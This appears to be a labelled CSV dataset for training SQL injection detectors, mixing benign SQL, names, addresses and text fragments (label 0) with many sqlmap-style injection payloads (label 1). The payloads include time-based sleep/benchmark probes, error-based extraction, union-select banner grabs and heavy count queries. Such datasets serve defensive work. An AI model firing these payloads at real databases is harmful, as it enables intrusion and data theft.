Sentence,Label
"1"" )  where 9511 = 9511  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --",1
"  SELECT Orders.shadowrID, Employees.becoming, Employees.please FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.seeID ORDER BY Orders.nestID",0
2144,0
apo90ico,0
1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik,1
SELECT TOP 3 * FROM yellow,0
rigby,0
SELECT greatest ( s )  FROM felt SELECT written FROM acres,0
 The theme day parish hall &quot; Sayings Bible &quot; &quot; Expressions Middle Ages &quot; ,0
1  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  5281 = 5281,1
" Except landing arrival aircraft , flight traffic temporarily suspended , reported ",0
SELECT * FROM past WHERE correctly = 'remarkable' LIMIT 3,0
54310177r,0
fikis8,0
"almendro, 28 6?c",0
kendell,0
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'nopu'  =  'nopu",1
fredesvinda,0
illa,0
villaverde de scar,0
" The Ecumenical Discussion Forum initiative Catholic Protestant churches Salem , Salem Castle Lake Constance District Cultural Office ",0
-9653' )  where 2705 = 2705 or 9323 = 9323#,1
"1'  )  )   )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
24 barrel late morning Europe electronic trading New York Mercantile Exchange ,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and ""rugr"" = ""rugr",1
SELECT * FROM sale WHERE shirt BETWEEN '1996-07-01' AND '1996-07-31',0
"  SELECT YEARWEEK ( ""2017-10-25"" ) ;",0
" Do robots tasks ? In case systems Gmail , robots also identify information Google requires displaying context-based advertising ",0
1613,0
FROM  ( SELECT DISTINCT death FROM receive ) ,0
siomara,0
48573885r,0
6966776615880147,0
"-6333""  )  )   )  union all select 9851,9851,9851,9851,9851,9851--",1
" To get 20 years , killing 202 people injuring many hundreds , &apos;s much ",0
"1""  )  )   as ycvh where 4523 = 4523 and sleep ( 5 ) #",1
DELETE FROM tomorrow,0
"1%""  )  )   or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  ""%"" = """,1
viena@redesmilitantes.pg,0
 and 1 in   (  select var from temp  )  --,1
botarell,0
chaddie,0
64179446q,0
"1 )  as lhie where 4631 = 4631 union all select null,null,null,null,null--",1
0936495801431480,0
"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
SELECT AVG ( somehow ) FROM make SELECT SUM ( shade ) ,0
SELECT * FROM behavior WHERE uncle NOT LIKE 'ruler%',0
8812120000000000,0
07807880r,0
-7387'  )  )   )  order by 1--,1
select * from users where id  =  '1' or \<1 or 1  =  1 -- 1',1
duffield@telelujo.coop,0
4557,0
SELECT * FROM football WHERE shaking = 'sport'  OR clothing = 'oil',0
"SELECT customername, contactname FROM  customers; ",0
"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",1
"1' in boolean mode )  and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
" Your genuine action explain itself, explain genuine actions",0
SELECT AVG ( easily ) FROM sat,0
"-9881""  )  )   or 9850 = 8118#",1
ma724-3ra,0
8505,0
e0u08os1,0
SELECT COUNT ( bee ) FROM palace,0
" select * from users where id  =  '1' *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1'",1
01237478d,0
"  SELECT Orders.easierrID, Employees.organized, Employees.general FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.courtID ORDER BY Orders.soonID",0
SELECT * FROM slave ORDER BY wire,0
" select * from users where id = 1 or "".]"" or 1 = 1 -- 1",1
"select * from generate_series ( 1488,1488,case when  ( 1488 = 1685 )  then 1 else 0 end )  limit 1--",1
"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,1
"1"" where 9341  =  9341",1
"1"" and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ",1
"1'+ ( select ouhd where 8905 = 8905 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  +'",1
7094785480687274,0
DELETE FROM jet,0
sandberg@3horas.tl,0
cecchetto casavieja,0
cerd,0
1'||  (  select 'adoe' from dual where 7662  =  7662,1
"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",1
" They estimate additional costs incur result &quot; energy turnaround &quot; , able recover means levy price electricity ",0
 The entire ground floor suffered damage ,0
"sainz de la calleja 75,",0
1'+ ( select 'tmel' where 2655 = 2655 rlike  ( select  ( case when  ( 2118 = 8500 )  then 1 else 0x28 end  )  )   ) +',1
"-6492'  )   union all select 7204,7204--",1
ulldecona,0
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'ykjs' like 'ykjs,1
" &quot; We address subject municipal rates , investments made coming years could subsidies , &quot; commented Gerster regarding matter ",0
c0l0o4a,0
ashida@gaudio.my,0
" select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
"  UPDATE won SET known =  'prepare', City =  'far' WHERE dust =  terrible",0
"1""  )  )   as ynuw where 9138 = 9138",1
"  SELECT MAKETIME ( 838,   59, 59 ) ;",0
1'||  (  select 'vpuh' where 8164  =  8164,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 292420 )  ORDER BY meta_id ASC",0
SELECT brave FROM tongue UNION ALL SELECT ought FROM business ORDER BY specific,0
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'yqbo'  =  'yqbo,1
1 )  union all select null#,1
"1'+ ( select aahc where 5436 = 5436 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   ) +'",1
"c/ toledo 22,",0
2589729012586382,0
SELECT TOP 3 * FROM met,0
DELETE FROM scientific,0
-1479%' or 5201 = 3398--,1
1'  )   and 1987  =  3756#,1
casares portabella,0
schucrenberg-oheaney3@testdevelcidad.info,0
8954375699794509,0
21184515c,0
"  SELECT include,corner,first FROM thin LEFT JOIN Orders ON tongue.freshID =  young.class ORDER BY everywhere.flew",0
"   SELECT careful, aware, reasonFROM plane WHERE flag  IS NOT NULL",0
"SELECT * FROM attack WHERE walk BETWEEN ""jet"" AND    ""dog""",0
"1%""  )  )   or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"1%'  )  )   or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  '%' = '",1
"-1164"" )  union all select 6617,6617,6617,6617,6617,6617--",1
cabrea_r,0
"1"" )  as xioc where 7260 = 7260 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
"1 where 2914 = 2914 union all select null,null,null#",1
SELECT pupil ( s FROM root RIGHT JOIN,0
"calle villatorres, 109 7?d",0
taber2era,0
1 where 9752  =  9752,1
5366,0
"pl. francisca pacheco, 81",0
SELECT AVG ( came )  FROM fix  SELECT SUM ( cut ) ,0
mandruso,0
"calle arfian 36,",0
8586,0
SELECT COUNT ( clean )  FROM influence,0
select case when 3252 = 9622 then 1 else null end--,1
SELECT AVG ( greatest ) FROM seen,0
SELECT * FROM with WHERE loose = 'have' FETCH FIRST 3 ROWS ONLY,0
"1""  )   as mibc where 3113  =  3113",1
SELECT * FROM space WHERE adult LIKE '%situation%',0
"1"" where 3247 = 3247 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""hjxh""  =  ""hjxh",1
"ventallols, 138 8?f",0
SELECT AVG ( cookies ) FROM branch SELECT SUM ( property ) ,0
pospisil,0
51620770f,0
orencio,0
1  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( 2197 = 2197,1
1846096870233397,0
"1"" )  where 2834 = 2834  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1
7919,0
"-6412   )    )    as cnfs where 6557  =  6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",1
1  )   where 6725  =  6725 and 1553  =  7419,1
"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ygfv'  =  'ygfv",1
sols galcera,0
"1%""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""%""  =  """,1
SELECT AVG ( exclaimed ) FROM doing SELECT SUM ( planet ) ,0
rigau amer,0
ellacott2,0
"1, ( select  ( case when  ( 7616 = 7616 )  then 1 else 1/ ( select 0 )  end  )  )  ",1
manzaneque@ssextremadura.mt,0
SELECT accurate ( s )  FROM huge FULL OUTER JOIN,0
"1'||  (  select 'qsgi' where 1707  =  1707 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",1
"1 where 7158 = 7158 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
"1%"" )  and elt ( 7436 = 9874,9874 )  and  ( ""%"" = """,1
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'lxqz'  =  'lxqz",1
SELECT AVG ( chose ) FROM buy SELECT SUM ( beside ) ,0
SELECT COUNT ( similar ) FROM similar,0
1'  )   union all select null#,1
"1""   )    )     )   and   (  7396  =  6351  )  *6351 and    (    (     (  ""xerw"" like ""xerw",1
1%' order by 1--,1
SELECT * FROM prepare WHERE began NOT LIKE 'flew%',0
"1'  )  )   )  or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
SELECT * FROM dollar WHERE appropriate BETWEEN '1996-07-01' AND '1996-07-31',0
1 )  and 9198 = 9198--,1
kangning,0
1'||  (  select 'ldad' where 6146  =  6146 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  ||',1
1'|| ( select 'rhcv' where 6228 = 6228,1
SELECT zero,0
difusora,0
-4595' )  where 4892 = 4892 order by 1--,1
1943374801106050,0
"-5174'   )    )     )   or make_set  (  9515  =  7938,7938  )   and    (    (     (  'ygee'  =  'ygee",1
vyza,0
SELECT AVG ( television ) FROM thrown,0
1 where 8095 = 8095,1
"1%""   )    )    rlike   (  select   (  case when   (  4207  =  1757  )   then 1 else 0x28 end   )    )    and    (    (   ""%""  =  """,1
"1' in boolean mode )  union all select null,null,null,null,null,null,null,null,null,null--",1
"1' )  as pfwt where 8448 = 8448 union all select null,null,null,null,null,null,null,null,null#",1
"1"" where 6686  =  6686 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
ganzel@wdsl.tr,0
lupiana,0
"norte 131, 8?e",0
sazarina_logue@gay-tantra.lc,0
hi' or 1  =  1 --,1
or 0  =  0 --,1
 or '' ',1
SELECT cover FROM building,0
"1  )  )   )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 9462 = 9462",1
1'  )  )   as wjfj where 3802 = 3802,1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1
gervasio,0
SELECT save ( s )  FROM fairly UNION ALL,0
"-1964'  )   as ihsp where 6379  =  6379 or elt  (  6945  =  6165,6165  )  --",1
1'|| ( select 'allj' where 7334 = 7334,1
select case when 7634  =  3954 then 1 else null end--,1
"1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997",1
r54o60a,0
SELECT DISTINCT citizen FROM everywhere,0
villamediana de iregua,0
hanzlice,0
SELECT Count ( * )  AS sitting,0
"1"" )  where 2764 = 2764 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --",1
SELECT AVG ( hand ) FROM term SELECT SUM ( stomach ) ,0
"masia can rei 193, 8d",0
SELECT * FROM somewhere 3 SELECT * FROM damage,0
c/ doctor luis calandre 44,0
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'rvwk'  =  'rvwk",1
"1"" )  where 4172 = 4172 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #",1
8129789794999287,0
aceituna,0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_doing_cron' LIMIT 1,0
-4681 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rltx,1
granera,0
SELECT MIN ( entirely )  AS factory FROM straight,0
-8187'  )  )   )  or 1698 = 2823#,1
SELECT pig FROM near UNION SELECT position FROM earth ORDER BY happen,0
"-1376%""   )    )     )   or 3458  =  9503 and    (    (     (  ""%""  =  """,1
algu chavarri,0
"calle las mimosas, 109 5?f",0
v70t4oso,0
begin if  ( 5624 = 5624 )  then dbms_lock.sleep ( 5 ) ,1
2383965085524849,0
" A young team visionaries headed White House , nation ready change ",0
1  )  )   and  ( 3020 = 3020 ) *6703 and   (  (  3078 = 3078,1
narbo_nesa,0
"-8491"" where 6107 = 6107 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",1
"1' in boolean mode )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  #",1
copley@pisossantcugat.bf,0
ilana,0
1   )    )    and 7533  =  7533 and    (    (   8738  =  8738,1
caizares,0
jord,0
SELECT AVG ( wing ) FROM becoming,0
31593,0
SELECT * FROM grade FETCH FIRST 50 PERCENT ROWS ONLY,0
"-1588%""  )  )   )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
jack@cenitsoria.sc,0
montferri,0
 The four musicians accompany Cuban rhythms guests bar time ,0
-7103  )  )   or 4610 = 1871 and   (  (  1249 = 1249,1
"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1
condensador,0
1%'  )  )   )  and 1661 = 7683,1
" Here find residence powerful man north Alps , Praetor CCAA ",0
SELECT copper ( s )  FROM day SELECT layers FROM success,0
35141479d,0
"1%'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1'|| ( select 'hwdj' where 8179 = 8179,1
"el provencio, 6 8f",0
"1"" )  as zovk where 4591 = 4591 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",1
martn de yeltes,0
"1'  )  )   as omwk where 1414 = 1414 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
humphrie,0
riedel villaplana,0
"1'|| ( select 'ymac' from dual where 9268 = 9268 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   ) ||'",1
9385780627956523,0
"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
" Since 2008 , group volunteers helped nearly 32,000 people ",0
9i3a,0
macdougall_laurier@rocofer.am,0
hsketh,0
27340064x,0
 They achieved promising results English Chinese transcribed speech texts,0
" That &apos;s around 600 million pounds worth Hershey bars , lollipops , Milk Duds , Twizzlers Clark Bars ",0
"-8129'   )    )     )   union all select 4531,4531,4531#",1
carataunas,0
" select * from users where id = 1 or 1#""$ union select null,version (  )  -- 1",1
"-9572%"" )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""%"" = """,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 365884 )  ORDER BY meta_id ASC",0
SELECT * FROM noted FETCH FIRST 50 PERCENT ROWS ONLY,0
4956996115343204,0
"1%'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",1
"iif  (  1217  =  8831,1,1/0  )  ",1
1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',1
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (   ( 'jutx' = 'jutx",1
31410,0
guillena,0
"1"" where 8727 = 8727",1
"c/ ereta, 104,",0
DELETE FROM married WHERE suppose = 'local',0
"1""   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
42112,0
alejandre.mickel@hiperbilbao.nl,0
SELECT AVG ( base ) FROM note,0
"1""  )   where 8095  =  8095 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
 or uid like '%,1
" This wild card procedure , Neckar Riesen one applicant fewer ",0
"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,1
